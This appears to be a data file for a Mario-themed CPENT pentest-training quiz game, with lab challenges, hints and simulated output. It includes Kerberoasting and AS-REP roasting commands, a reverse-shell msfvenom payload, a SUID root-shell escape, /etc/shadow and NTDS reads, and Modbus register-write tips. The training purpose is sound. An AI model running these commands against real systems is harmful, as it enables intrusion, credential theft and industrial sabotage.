export const MARIO_RANKS = [
  { minLevel: 1, title: 'Small Mario (迷你駭客)', sprite: '🍄', color: '#ff4444' },
  { minLevel: 3, title: 'Super Mario (超級滲透者)', sprite: '⭐', color: '#38bdf8' },
  { minLevel: 5, title: 'Fire Mario (火焰 Exploit)', sprite: '🔥', color: '#f59e0b' },
  { minLevel: 7, title: 'Cape Mario (穿透斗篷羽毛)', sprite: '🪶', color: '#a855f7' },
  { minLevel: 9, title: 'CPENT World Champion (破關宗師)', sprite: '👑', color: '#eab308' }
];

export const MARIO_SHOP_ITEMS = [
  {
    id: 'item_mushroom',
    name: '超級紅蘑菇 (Super Mushroom)',
    category: 'powerup',
    price: 60,
    icon: '🍄',
    description: '變身 Super Mario！立即回復 50 HP，並提升當前生命上限。',
    effectType: 'heal_hp',
    healValue: 50
  },
  {
    id: 'item_fire_flower',
    name: '火焰花 (Fire Flower)',
    category: 'gear',
    price: 150,
    icon: '🔥',
    description: '裝備後可發射 Exploit 火球！AD 與 Pivoting 關卡爆擊率提升 30%。',
    effectType: 'fireball_crit'
  },
  {
    id: 'item_starman',
    name: '無敵金星 (Starman)',
    category: 'consumable',
    price: 90,
    icon: '⭐',
    description: '獲得無敵星狀態！立即重置目標 IDS 警報，並抵禦下一次失誤扣血。',
    effectType: 'invincible'
  },
  {
    id: 'item_green_pipe',
    name: '綠色縮時水管 (Warp Pipe)',
    category: 'gear',
    price: 180,
    icon: '🧪',
    description: '遭遇 Pivoting 隧道題目時，自動為你排除 1 個錯誤干擾水管。',
    effectType: 'pipe_filter'
  },
  {
    id: 'item_1up',
    name: '1-UP 綠蘑菇 (Extra Life)',
    category: 'gear',
    price: 200,
    icon: '🟢',
    description: '增加一條備用命！HP 歸零時立刻以 40 HP 滿血復活。',
    effectType: 'extra_life'
  }
];

export const MARIO_WORLDS = [
  {
    id: 'world_1',
    worldNum: '1',
    name: 'WORLD 1 // 邊界平原 (Perimeter Recon)',
    stageCode: 'WORLD 1-1',
    themeColor: '#00e800',
    skyBg: 'linear-gradient(180deg, #5c94fc 0%, #000 100%)',
    bossName: 'WAF Goomba Guard (邊界守衛)',
    dockerService: 'cpent-recon-gateway',
    targetIp: '10.10.10.200',
    description: '晴空萬里的偵察平原，隱藏著非標準端口與防火牆水管。利用高速掃描打通前線！',
    challenges: [
      {
        id: 'w1_1',
        stage: '1-1',
        title: '全端口高速精準探測 (All-Ports Scan)',
        difficulty: 'Easy',
        targetHost: '10.10.10.200 (EDGE-GATEWAY)',
        targetOS: 'Linux Alpine / Hardened Kernel',
        scenario: '【WORLD 1-1 邊界平原】前方遇到未知邊界主機阻擋！目標主機有多達 65535 個端口，隱藏服務常開在極高埠位（例如 49152+）。在限時考試下，請輸入最標準、最快且不漏埠的 Nmap 全端口探測指令：',
        expectedCommand: 'nmap -sS -p- --min-rate 2000 -T4 -Pn 10.10.10.200 -oN allports.txt',
        commandKeywords: ['nmap', '-p-', '2000', '10.10.10.200'],
        flagsExplained: [
          { flag: '-sS', name: 'TCP SYN Stealth Scan', desc: '半開放半握手掃描，速度快且不易被簡易防火牆記為完整連線。' },
          { flag: '-p-', name: 'Scan All 65535 Ports', desc: '強制掃描從 1 到 65535 所有端口，絕不放過任何非標準隱藏服務！' },
          { flag: '--min-rate 2000', name: 'Minimum Packet Rate', desc: '設定最低發包速率為 2000 pkt/s，將原需 40 分鐘的掃描壓縮至 90 秒內。' },
          { flag: '-Pn', name: 'Treat All Hosts as Online', desc: '跳過 ICMP Ping 探測，防止因防火牆阻斷 Ping 而誤判主機離線。' },
          { flag: '-oN allports.txt', name: 'Output Normal Format', desc: '將掃描結果留存到檔案，做為後續第 2 階段深層服務列舉依據。' }
        ],
        tutorGuide: {
          concept: 'CPENT 限時雙階段掃描法則：永遠不要直接對 65535 端口同時下 `-sC -sV`！這會造成大量封包逾時並卡死數小時。正確策略是 Stage 1 用 `--min-rate 2000` 快速撈出開著的埠號清單，Stage 2 再鎖定這些特定埠深入探測。',
          pitfalls: '若漏掉了 `-Pn`，當主機防火牆封鎖 ICMP Echo 時，Nmap 會直接顯示 "Host seems down"，白白浪費時間！',
          level1Hint: '試試看使用 nmap 的 SYN 掃描，掃描全部 65535 端口，並提高發包速率。',
          level2Hint: '關鍵參數組合包括 `-sS`、`-p-`、`--min-rate 2000`、`-Pn` 與目標 IP。',
          level3Hint: '完整標準語法：nmap -sS -p- --min-rate 2000 -T4 -Pn 10.10.10.200 -oN allports.txt'
        },
        simulatedOutput: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 09:30 CST
Initiating SYN Stealth Scan at 09:30
Scanning 10.10.10.200 [65535 ports]
Discovered open port 22/tcp on 10.10.10.200
Discovered open port 80/tcp on 10.10.10.200
Discovered open port 49821/tcp on 10.10.10.200
Completed SYN Stealth Scan at 09:31, 74.22s elapsed (65535 total ports)
Nmap scan report for 10.10.10.200
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
49821/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 74.35 seconds`,
        flag: 'flag{nmap_fast_port_discovery_49821_open}',
        options: [
          {
            text: 'nmap -sS -p- --min-rate 2000 -T4 -Pn 10.10.10.200 -oN allports.txt',
            isCorrect: true,
            isCritical: true,
            damage: 40,
            feedback: '【發射火球！+100 PTS】全端口 SYN 探測迅速抓出 49821 隱藏 SSH 水管！'
          },
          {
            text: 'nmap -sV -sC -p- 10.10.10.200',
            isCorrect: false,
            feedback: '【撞到障礙！】全部 65535 埠同時跑腳本導致時間超時 (Time Out)！'
          },
          {
            text: 'nmap -T1 -p 1-1000 10.10.10.200',
            isCorrect: false,
            feedback: '【速度太慢】T1 蝸牛爬行，完全錯過非標準高位埠！'
          },
          {
            text: 'ping -c 4 10.10.10.200',
            isCorrect: false,
            feedback: '【揮空！】目標主機禁 ping，空手而歸。'
          }
        ],
        hint: '第一階段先用 `-sS -p- --min-rate 2000 -Pn` 快速抓出開放埠號。',
        cpentNote: 'CPENT 雙階段掃描法：Stage 1 快速全埠位標記（min-rate 鎖定在 1500~2500 防反制）；Stage 2 針對特定端口深入腳本列舉。'
      }
    ]
  },
  {
    id: 'world_2',
    worldNum: '2',
    name: 'WORLD 2 // 地底域控古堡 (Active Directory)',
    stageCode: 'WORLD 2-1',
    themeColor: '#bf00ff',
    skyBg: 'linear-gradient(180deg, #1b0c2e 0%, #000 100%)',
    bossName: 'Bowser DC (域管庫巴魔王)',
    dockerService: 'cpent-ad-samba-dc',
    targetIp: '192.168.10.10',
    description: '幽暗的地底世界，充斥著 Kerberos 票證守衛與 BloodHound 迷宮。奪取黃金票證即可通關！',
    challenges: [
      {
        id: 'w2_1',
        stage: '2-1',
        title: 'Kerberoasting 服務票證提取 (GetUserSPNs)',
        difficulty: 'Medium',
        targetHost: '192.168.10.15 (SRV-SQL01.CORP.LOCAL)',
        targetOS: 'Windows Server 2019',
        scenario: '【WORLD 2-1 地底地道】你已取得普通域使用者帳號 `corp.local/guest01:Password123`，DC 伺服器 IP 為 `192.168.10.10`。請輸入 Impacket 指令向 KDC 請求所有註冊了 SPN 的服務帳號 TGS 票證：',
        expectedCommand: 'impacket-GetUserSPNs corp.local/guest01:Password123 -dc-ip 192.168.10.10 -request',
        commandKeywords: ['GetUserSPNs', 'guest01', '192.168.10.10', '-request'],
        flagsExplained: [
          { flag: 'corp.local/guest01:Password123', name: 'Domain Credentials', desc: '合法的域用戶憑據，任何域內合法成員皆有權向 KDC 索取 TGS 票證。' },
          { flag: '-dc-ip 192.168.10.10', name: 'Domain Controller IP', desc: '指定 Active Directory 網域控制站 IP 地址。' },
          { flag: '-request', name: 'Request TGS Tickets', desc: '【關鍵必備】若沒有加上此參數，程式只會列出 SPN 清單，不會向 KDC 索取 TGS 雜湊！' },
          { flag: '-outputfile hashes.kerberoast', name: 'Output File', desc: '將提取到的 TGS-REP 格式雜湊存檔，方便直接以 Hashcat 13100 破解。' }
        ],
        tutorGuide: {
          concept: 'Kerberoasting 攻擊原理：SPN 是服務帳號在 Kerberos 體系下的註冊標識。任何通過認證的域帳號，皆可向 KDC 索取任意服務帳號的 TGS 票證。該票證由目標服務帳號的 NTLM 密碼雜湊加密，因此可在攻擊者本機進行離線暴力字典破解！',
          pitfalls: '最常犯的考試失誤就是忘了加 `-request`！如果不加，終端機只會印出一張表格列出哪些帳號有 SPN，卻完全不會吐出 hashcat 破解字串！',
          level1Hint: '使用 impacket 工具套件中的 GetUserSPNs，並附上普通帳號與 DC IP。',
          level2Hint: '請務必帶上 `-request` 參數，向 KDC 實際請求 TGS 票證雜湊。',
          level3Hint: '完整語法：impacket-GetUserSPNs corp.local/guest01:Password123 -dc-ip 192.168.10.10 -request'
        },
        simulatedOutput: `Impacket v0.11.0 - Copyright 2023 Fortra
[*] Resolving 192.168.10.10...
[*] Requesting TGS for SPN: MSSQLSvc/SRV-SQL01.corp.local:1433
$krb5tgs$23$*mssql_svc$CORP.LOCAL$corp.local/mssql_svc*$a7d3b0e12f...
$krb5tgs$23$*CORP.LOCAL\\mssql_svc*...
[*] Extracted 1 hash for offline cracking!
Hash format ready for Hashcat -m 13100:
$krb5tgs$23$*mssql_svc$CORP.LOCAL$CORP.LOCAL/mssql_svc*...`,
        flag: 'flag{kerb3r0asting_tgs_13100_dump3d}',
        options: [
          {
            text: 'impacket-GetUserSPNs corp.local/guest01:Password123 -dc-ip 192.168.10.10 -request',
            isCorrect: true,
            isCritical: true,
            damage: 40,
            feedback: '【發射火球！+200 PTS】成功 Dump 出 MSSQL 服務帳號的 TGS 票證雜湊！'
          },
          {
            text: 'impacket-secretsdump corp.local/guest01:Password123@192.168.10.15 -ntds vss',
            isCorrect: false,
            feedback: '【被庫巴刺猬扎到！】guest01 僅為普通使用者，無權讀取 NTDS.dit。'
          },
          {
            text: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat',
            isCorrect: false,
            feedback: '【走錯路口】這是 AS-REP Roasting，不是 Kerberoasting！'
          },
          {
            text: 'impacket-wmiexec corp.local/guest01@192.168.10.15 "net user /domain"',
            isCorrect: false,
            feedback: '【WMI 被擋】guest01 沒有管理員執行權限。'
          }
        ],
        hint: '查詢 SPN 並索取 TGS 票證需加上 `-request`。',
        cpentNote: 'Kerberoasting 只要擁有任何合法域憑據即可對整個目錄林發動。使用 Impacket GetUserSPNs.py -request 取得 TGS-REP 雜湊，接著送入 Hashcat 13100 破解。'
      },
      {
        id: 'w2_2',
        stage: '2-2',
        title: 'AS-REP Roasting 免預先驗證竊取 (GetNPUsers)',
        difficulty: 'Medium',
        targetHost: '192.168.10.10 (DC01.CORP.LOCAL)',
        targetOS: 'Windows Server 2022',
        scenario: '【WORLD 2-2 免驗證深坑】在尚未取得密碼的情況下，已知域內有一份潛在使用者列表 `users.txt`，部分帳號未開啟 Kerberos 預先認證。請輸入 Impacket 指令提取 AS-REP 雜湊：',
        expectedCommand: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.10.10',
        commandKeywords: ['GetNPUsers', 'users.txt', '-no-pass', '192.168.10.10'],
        flagsExplained: [
          { flag: 'corp.local/', name: 'Domain Name', desc: '指定目標網域名稱。' },
          { flag: '-usersfile users.txt', name: 'Users Wordlist', desc: '傳入可能存在的使用者帳號名單進行批量測試。' },
          { flag: '-no-pass', name: 'No Password Required', desc: '【核心】聲明攻擊者目前沒有密碼，直接請求免預認證票證。' },
          { flag: '-dc-ip 192.168.10.10', name: 'Domain Controller IP', desc: '直連目標 DC 的 Kerberos 88 端口。' }
        ],
        tutorGuide: {
          concept: 'AS-REP Roasting 針對的是帳號屬性中勾選了 "Do not require Kerberos preauthentication (DONT_REQ_PREAUTH)" 的目標。任何人皆可發送偽造的 AS-REQ，KDC 會毫不猶豫地返回以該使用者密碼雜湊加密的 AS-REP 封包，送入 Hashcat 18200 破解。',
          pitfalls: '記得是 `-no-pass` 參數，如果錯誤傳入空密碼或缺少該參數，工具可能誤認為要進行交互式登入。',
          level1Hint: '使用 GetNPUsers，傳入 users.txt 並指定免密碼測試。',
          level2Hint: '關鍵參數包含 `-usersfile`、`-no-pass` 與 `-dc-ip`。',
          level3Hint: '完整語法：impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.10.10'
        },
        simulatedOutput: `Impacket v0.11.0 - Copyright 2023 Fortra
[*] Getting TGT for jsmith
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Getting TGT for svc_backup
$krb5asrep$23$svc_backup@CORP.LOCAL:3d56a29...
[*] Hash ready for Hashcat -m 18200`,
        flag: 'flag{asrep_roast_svc_backup_cracked}',
        options: [
          {
            text: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.10.10',
            isCorrect: true,
            isCritical: true,
            damage: 42,
            feedback: '【金幣噴發！+300 PTS】成功取得未啟用 Pre-Auth 的 AS-REP 雜湊！'
          },
          {
            text: 'impacket-ticketConverter ticket.kirbi ticket.ccache',
            isCorrect: false,
            feedback: '【道具用錯】ticketConverter 僅用於票證格式轉換。'
          },
          {
            text: 'nmap --script smb-vuln-ms17-010 -p 445 192.168.10.10',
            isCorrect: false,
            feedback: '【偏離主線】這是永恆之藍探測，無關 AS-REP。'
          },
          {
            text: 'kerbrute userenum --dc 192.168.10.10 -d corp.local userlist.txt -p password',
            isCorrect: false,
            feedback: '【非 AS-REP】枚舉使用者與取得 AS-REP 雜湊不同。'
          }
        ],
        hint: '尋找免預先認證的帳號使用 GetNPUsers，搭配 -no-pass 與使用者清單。',
        cpentNote: '若設定 DONT_REQ_PREAUTH，任何人都可以發送 AS-REQ，KDC 返回使用者密碼雜湊加密的 AS-REP。Hashcat 模組 18200。'
      }
    ]
  },
  {
    id: 'world_3',
    worldNum: '3',
    name: 'WORLD 3 // 水管穿透深淵 (Double Pivoting)',
    stageCode: 'WORLD 3-1',
    themeColor: '#00f3ff',
    skyBg: 'linear-gradient(180deg, #022030 0%, #000 100%)',
    bossName: 'Subnet Titan (隔離子網領主)',
    dockerService: 'cpent-pivoting-box',
    targetIp: '172.16.50.15',
    description: '被防火牆隔離的子網絡！跳入綠色 Ligolo 水管，打通 TUN 虛擬網卡與 Chisel 反向隧道！',
    challenges: [
      {
        id: 'w3_1',
        stage: '3-1',
        title: '綠色水管：Ligolo-ng 內網雙向路由配置',
        difficulty: 'Medium',
        targetHost: '10.10.120.5 (Jump Box)',
        targetOS: 'Ubuntu 22.04 LTS (雙網卡)',
        scenario: '【WORLD 3-1 水管隧道】Ligolo-ng agent 已成功回連你的攻擊機。跳板機連接著內網網段 `172.16.50.0/24`。為了讓攻擊機的所有工具 (如 Nmap, CrackMapExec) 透過 TUN 虛擬網卡直連該子網，請在攻擊機 Linux 終端輸入路由設定指令：',
        expectedCommand: 'sudo ip route add 172.16.50.0/24 dev ligolo',
        commandKeywords: ['ip route add', '172.16.50.0/24', 'dev ligolo'],
        flagsExplained: [
          { flag: 'sudo', name: 'Root Privilege', desc: '修改 Linux 系統路由表必須具備超級管理員權限。' },
          { flag: 'ip route add 172.16.50.0/24', name: 'Target Subnet', desc: '指定要路由的目標隔離網段與子網路遮罩。' },
          { flag: 'dev ligolo', name: 'Target Interface', desc: '將此網段的封包全數交給 Ligolo 建立的 TUN 虛擬網卡處理。' }
        ],
        tutorGuide: {
          concept: 'Ligolo-ng 的革命性優勢：以往 Chisel + Proxychains 只能轉發 TCP 握手，無法發送 ICMP 或 SYN 封包，速度緩慢且容易斷線。Ligolo-ng 在本機建立真正的 TUN 介面，透過 `ip route add` 之後，你的 Kali 本機就像直接插了網線在目標內網交換機上一樣！',
          pitfalls: '設定完路由後，務必記得在 Ligolo 的 proxy 終端內輸入 `start` 啟動隧道轉發，否則封包會滯留在網卡。',
          level1Hint: '使用 ip route add 將 172.16.50.0/24 導向 ligolo 網卡。',
          level2Hint: '記得加上 sudo，語法為 `sudo ip route add <網段> dev ligolo`。',
          level3Hint: '完整語法：sudo ip route add 172.16.50.0/24 dev ligolo'
        },
        simulatedOutput: `[sudo] password for kali:
[OK] Route added: 172.16.50.0/24 via dev ligolo
ligolo-ng >> session
[1] 10.10.120.5 - ubuntu (172.16.50.1)
ligolo-ng >> start
[INFO] Starting tunnel to 172.16.50.0/24... TUN interface up!`,
        flag: 'flag{ligolo_ng_tun_interface_routed}',
        options: [
          {
            text: 'sudo ip route add 172.16.50.0/24 dev ligolo',
            isCorrect: true,
            isCritical: true,
            damage: 45,
            feedback: '【水管打通！咻～】成功將子網綁定至 ligolo TUN 虛擬網卡，全協議無縫穿透！'
          },
          {
            text: 'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 172.16.50.1',
            isCorrect: false,
            feedback: '【水管卡住】單埠轉發無法支援多協議原生掃描。'
          },
          {
            text: 'route add -net 172.16.50.0 netmask 255.255.255.0 gw 127.0.0.1',
            isCorrect: false,
            feedback: '【死循環】導向 127.0.0.1 會封包迴圈！'
          },
          {
            text: 'proxychains -q nmap 172.16.50.0/24',
            isCorrect: false,
            feedback: '【速度太慢】Ligolo 的優勢就是擺脫 Proxychains 延遲！'
          }
        ],
        hint: 'Ligolo-ng 依賴 TUN 裝置，以 `ip route add <subnet> dev ligolo` 綁定。',
        cpentNote: 'Ligolo-ng 建立 TUN 網卡後，直接執行原生 Nmap -sT 與 SMB 工具極度順暢，擺脫 Proxychains 限制。'
      }
    ]
  },
  {
    id: 'world_4',
    worldNum: '4',
    name: 'WORLD 4 // 工控齒輪工廠 (OT & SCADA)',
    stageCode: 'WORLD 4-1',
    themeColor: '#ffb000',
    skyBg: 'linear-gradient(180deg, #2b1d00 0%, #000 100%)',
    bossName: 'SCADA Automaton (工控中樞核心)',
    dockerService: 'cpent-modbus-simulator',
    targetIp: '192.168.88.20',
    description: '巨大齒輪與 PLC 閥門旋轉的工控工廠。利用 Modbus 協議偽造暫存器數據，解除實體防線！',
    challenges: [
      {
        id: 'w4_1',
        stage: '4-1',
        title: '閥門齒輪：Modbus 探測與保持暫存器讀取',
        difficulty: 'Medium',
        targetHost: '192.168.88.20 (PLC-STATION-01)',
        targetOS: 'Embedded RTOS (Modbus Port 502)',
        scenario: '【WORLD 4-1 工控工廠】目標開啟了 502 端口 (Modbus TCP)。根據現場工程規範，水冷閥門狀態儲存在保持暫存器 (Holding Registers) 中。在 Modbus 標準協議中，讀取保持暫存器對應的功能碼 (Function Code) 為何？',
        expectedCommand: '0x03',
        commandKeywords: ['0x03', 'Read Holding Registers', 'FC03', '3'],
        flagsExplained: [
          { flag: 'FC 0x01', name: 'Read Coils', desc: '讀取離散輸出線圈 (ON/OFF 狀態)。' },
          { flag: 'FC 0x02', name: 'Read Discrete Inputs', desc: '讀取唯讀離散數位輸入。' },
          { flag: 'FC 0x03', name: 'Read Holding Registers', desc: '【關鍵】讀取可讀寫的 16 位元保持暫存器數值。' },
          { flag: 'FC 0x04', name: 'Read Input Registers', desc: '讀取唯讀的 16 位元類比輸入暫存器。' },
          { flag: 'FC 0x06', name: 'Write Single Register', desc: '寫入覆蓋單個保持暫存器數值。' }
        ],
        tutorGuide: {
          concept: 'Modbus 協定完全不包含任何認證或存取控制。在 CPENT 考試中，只要定位 502 端口，使用 pymodbus 或 Nmap 的 modbus-discover.nse 腳本即可列舉暫存器內容。讀取目標溫度/壓力數值必備 FC03，修改關閉防護必備 FC06/FC16！',
          pitfalls: '記混功能碼會觸發工控系統的安全防護告警。保持暫存器永遠是 0x03 讀取、0x06 寫入。',
          level1Hint: '功能碼為兩位十六進制數，代表 Read Holding Registers。',
          level2Hint: 'Modbus 代碼 1=Coil, 2=Input, 3=Holding Register, 4=Input Register。',
          level3Hint: '標準代碼為：0x03 或 FC03'
        },
        simulatedOutput: `[+] Connected to Modbus TCP 192.168.88.20:502
[+] Sending Function Code 0x03 (Read Holding Registers, Start=40001, Count=5)...
[+] Register 40001: 0x00A5 (Cooling Valve OPEN)
[+] Register 40002: 0x03E8 (Pressure: 1000 kPa)
[+] Register 40003: 0x0001 (Emergency Interlock ARMED)
Flag captured in register memory!`,
        flag: 'flag{modbus_fc03_holding_regs_dumped}',
        options: [
          {
            text: 'Function Code 0x03 (Read Holding Registers)',
            isCorrect: true,
            isCritical: true,
            damage: 45,
            feedback: '【齒輪停轉！+250 PTS】成功以 FC03 讀取 40001 數值，取得冷卻系統覆寫權限！'
          },
          {
            text: 'Function Code 0x01 (Read Coils)',
            isCorrect: false,
            feedback: '【標的不符】0x01 讀取的是離散線圈，非保持暫存器。'
          },
          {
            text: 'Function Code 0x05 (Write Single Coil)',
            isCorrect: false,
            feedback: '【動作錯誤】0x05 是寫入單個線圈。'
          },
          {
            text: 'Function Code 0x10 (Write Multiple Registers)',
            isCorrect: false,
            feedback: '【觸發警報】未經校驗直接寫入觸發安全聯鎖！'
          }
        ],
        hint: 'Modbus 代碼：01=Coils, 02=Inputs, 03=Holding Registers, 04=Input Registers。',
        cpentNote: 'Modbus TCP 運行於 Port 502，無認證加密。使用 pymodbus 或 nmap modbus-discover 腳本可直接與 PLC 通信。'
      }
    ]
  },
  {
    id: 'world_5',
    worldNum: '5',
    name: 'WORLD 5 // 岩漿逆向熔爐 (Binary Exploit & IoT)',
    stageCode: 'WORLD 5-1',
    themeColor: '#ff0055',
    skyBg: 'linear-gradient(180deg, #3d0312 0%, #000 100%)',
    bossName: 'Stack Smasher (ROP 幽靈巨怪)',
    dockerService: 'cpent-bof-brainpan',
    targetIp: '10.10.20.80',
    description: '滾燙的岩漿與二進制碎片！精確計算 EIP 偏移量，避開壞字元，跳躍至 JMP ESP 踏板！',
    challenges: [
      {
        id: 'w5_1',
        stage: '5-1',
        title: '32-bit Buffer Overflow: EIP 精確偏移計算',
        difficulty: 'Hard',
        targetHost: '10.10.20.80:9999 (Brainpan Vulnerable Service)',
        targetOS: 'Windows 7 / x86 Architecture',
        scenario: '【WORLD 5-1 岩漿熔爐】在對脆弱服務進行 Fuzzing 時，使用長度 1000 的 pattern 導致程式崩潰，Debugger 顯示 EIP 被覆蓋為十六進制 `35724134`。請輸入 Metasploit 工具指令反推 EIP 精確偏移量 (Offset)：',
        expectedCommand: 'msf-pattern_offset -l 1000 -q 35724134',
        commandKeywords: ['pattern_offset', '1000', '35724134'],
        flagsExplained: [
          { flag: 'msf-pattern_offset', name: 'Metasploit Offset Tool', desc: '計算非重複循環字串中特定 4 位元組位置的逆向工具。' },
          { flag: '-l 1000', name: 'Pattern Length', desc: '當初生成的總 pattern 長度。' },
          { flag: '-q 35724134', name: 'Query Hex Value', desc: '從 Debugger 崩潰時 EIP 暫存器讀出的十六進制數值。' }
        ],
        tutorGuide: {
          concept: '緩衝區溢位的核心五步：1. Fuzz 確定崩潰長度 -> 2. pattern_create / pattern_offset 精準定位 EIP -> 3. 送入 0x00-0xFF 找出壞字元 (Bad Chars) -> 4. 尋找無 ASLR/DEP 的 JMP ESP 指令地址 -> 5. 組合 Shellcode 並加上 NOP Sled 完成彈跳！',
          pitfalls: '在 x86 架構中，注意字節序 (Little-Endian)！但 `msf-pattern_offset -q` 會自動幫你做字串轉換，直接填入 Debugger 看到的 35724134 即可。',
          level1Hint: '使用 msf-pattern_offset 查詢 35724134。',
          level2Hint: '帶上 `-l 1000` 與 `-q 35724134` 參數。',
          level3Hint: '完整指令：msf-pattern_offset -l 1000 -q 35724134'
        },
        simulatedOutput: `[*] Exact match at offset 524
[+] EIP overwritten at byte 524
Payload structure:
"A" * 524 + [JMP ESP ADDRESS (4 bytes)] + "\\x90" * 16 + [SHELLCODE]`,
        flag: 'flag{eip_offset_524_jmp_esp_ready}',
        options: [
          {
            text: 'msf-pattern_offset -l 1000 -q 35724134',
            isCorrect: true,
            isCritical: true,
            damage: 50,
            feedback: '【踩中跳台！+350 PTS】計算出 EIP Offset 為 524！可構造 JMP ESP 地址實現跳轉！'
          },
          {
            text: 'gdb-peda pattern_offset 0x41414141',
            isCorrect: false,
            feedback: '【掉落岩漿！】0x41414141 是純 AAAA 填料，無法反推。'
          },
          {
            text: 'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\\x00"',
            isCorrect: false,
            feedback: '【時機過早】尚未排除壞字元前，Shellcode 必定崩潰。'
          },
          {
            text: 'mona compare -f bytearray.bin -a esp',
            isCorrect: false,
            feedback: '【順序錯誤】此時尚未精準定位 EIP。'
          }
        ],
        hint: '使用 `msf-pattern_offset -q <EIP十六進制數值>` 即可精準定位偏移。',
        cpentNote: '溢位流程：Fuzzing -> Pattern Offset 定位 EIP -> 測試壞字元 -> 尋找 JMP ESP 地址 -> 組合 Exploit。'
      }
    ]
  },
  {
    id: 'world_6',
    worldNum: '6',
    name: 'WORLD 6 // 星星雲端王座 (CTF & Root Sovereign)',
    stageCode: 'WORLD 6-1',
    themeColor: '#eab308',
    skyBg: 'linear-gradient(180deg, #1f1b00 0%, #000 100%)',
    bossName: 'Root Sovereign (終極特權王座)',
    dockerService: 'cpent-suid-privesc',
    targetIp: '10.10.150.12',
    description: '浮空於雲端的最終關卡！尋找隱秘的 SUID 提權通道，奪取 Root Flag 登上 CPENT 冠軍王座！',
    challenges: [
      {
        id: 'w6_1',
        stage: '6-1',
        title: 'Linux SUID 異常檔案搜尋與特權提升',
        difficulty: 'Medium',
        targetHost: '10.10.150.12 (LINUX-STUDENT-WORKSTATION)',
        targetOS: 'Debian 11 (Linux Kernel 5.10)',
        scenario: '【WORLD 6-1 雲端王座】已取得 www-data 低權限 Shell。請輸入標準 Linux Find 指令搜尋系統中所有具有 SUID 權限的二進制檔案，並將無權存取的錯誤訊息導向 /dev/null：',
        expectedCommand: 'find / -perm -u=s -type f 2>/dev/null',
        commandKeywords: ['find', '-perm -u=s', '-type f', '2>/dev/null'],
        flagsExplained: [
          { flag: 'find /', name: 'Search From Root', desc: '從根目錄開始遞迴搜尋全系統檔案。' },
          { flag: '-perm -u=s', name: 'SUID Bit Filter', desc: '【關鍵】過濾出擁有 SUID (Set User ID) 權限位元的檔案。' },
          { flag: '-type f', name: 'File Type Only', desc: '限定只搜尋常規檔案，排除目錄或 Socket。' },
          { flag: '2>/dev/null', name: 'Discard Stderr', desc: '將無權存取 (Permission Denied) 的錯誤輸出拋棄，維持輸出乾淨。' }
        ],
        tutorGuide: {
          concept: 'SUID 二進制提權是 CPENT / OSCP 必考的基本功。當一般檔案被設置 SUID 時，執行者會暫時繼承該檔案擁有者 (通常為 root) 的權限。找到清單後，直接進入 GTFOBins 網站查詢該指令是否有逃逸提權手法（例如 find -exec /bin/sh -p \;）！',
          pitfalls: '語法若寫成 `-perm -4000` 或 `-perm -u+s` 亦可，但 `-perm -u=s` 是最明確的標準寫法。一定要加 `2>/dev/null`，否則終端機會被數百條拒絕存取訊息洗版。',
          level1Hint: '使用 find 指令搜尋根目錄，以 -perm 過濾 SUID。',
          level2Hint: '結合 `-perm -u=s`、`-type f` 與 `2>/dev/null`。',
          level3Hint: '完整指令：find / -perm -u=s -type f 2>/dev/null'
        },
        simulatedOutput: `/usr/bin/passwd
/usr/bin/chfn
/usr/bin/find  <--- [VULNERABLE SUID BINARY FOUND!]
/usr/bin/newgrp
/bin/mount
/bin/umount
[+] Execute: /usr/bin/find . -exec /bin/sh -p \\; -quit
# whoami
root
# cat /root/root.txt
flag{suid_find_root_privesc_complete}`,
        flag: 'flag{suid_find_root_privesc_complete}',
        options: [
          {
            text: 'find / -perm -u=s -type f 2>/dev/null',
            isCorrect: true,
            isCritical: true,
            damage: 42,
            feedback: '【抓住旗桿！FLAG CAPTURED！】發現 SUID `/usr/bin/find`，直接晉升為 ROOT！'
          },
          {
            text: 'ls -la /root 2>/dev/null',
            isCorrect: false,
            feedback: '【被阻擋】低權限無權列出 /root。'
          },
          {
            text: 'sudo -l',
            isCorrect: false,
            feedback: '【需要密碼】當前帳號無交互終端密碼。'
          },
          {
            text: 'cat /etc/shadow',
            isCorrect: false,
            feedback: '【權限不足】/etc/shadow 僅允許 root 讀取。'
          }
        ],
        hint: '尋找 SUID 二進制必備：`find / -perm -u=s -type f 2>/dev/null`。',
        cpentNote: '列出 SUID 檔案後，立即比對 GTFOBins (find, vim, cp, nmap, bash, pkexec 等)。'
      }
    ]
  }
];
